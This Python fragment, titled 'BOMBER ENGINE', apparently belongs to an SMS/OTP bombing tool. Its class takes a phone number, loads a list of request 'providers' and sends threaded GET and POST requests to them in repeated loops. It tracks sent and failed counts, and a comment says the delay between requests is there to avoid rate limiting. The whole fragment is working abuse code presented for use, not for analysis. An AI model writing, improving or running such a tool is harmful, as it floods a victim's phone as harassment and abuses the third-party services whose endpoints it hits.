# ============================================================
# BOMBER ENGINE
# ============================================================

class AhnafBomber:
    def __init__(self):
        self.running = False
        self.stats = {"sent": 0, "failed": 0, "total": 0}
    
    def send_request(self, provider):
        if not self.running:
            return
        try:
            h = provider.get("headers", {"Content-Type": "application/json"})
            if provider["method"] == "POST":
                r = requests.post(provider["url"], json=provider["data"], headers=h, timeout=10)
            else:
                r = requests.get(provider["url"], params=provider.get("data",{}), headers=h, timeout=10)
            if r.status_code in [200, 201, 202, 204]:
                self.stats["sent"] += 1
            else:
                self.stats["failed"] += 1
        except:
            self.stats["failed"] += 1
        self.stats["total"] += 1
    
    def start(self, phone, loops=1):
        self.running = True
        self.stats = {"sent": 0, "failed": 0, "total": 0}
        providers = get_providers(phone)
        
        print(f"📡 Total providers loaded: {len(providers)}")
        
        for loop in range(loops):
            if not self.running:
                break
            shuffled = random.sample(providers, len(providers))
            threads = []
            for p in shuffled:
                if not self.running:
                    break
                t = threading.Thread(target=self.send_request, args=(p,))
                t.start()
                threads.append(t)
                time.sleep(0.05)  # Small delay to avoid rate limiting
            for t in threads:
                t.join()
            time.sleep(0.5)
        
        self.running = False
        print(f"✅ Sent: {self.stats['sent']}, Failed: {self.stats['failed']}")
        return self.stats
    
    def stop(self):
        self.running = False

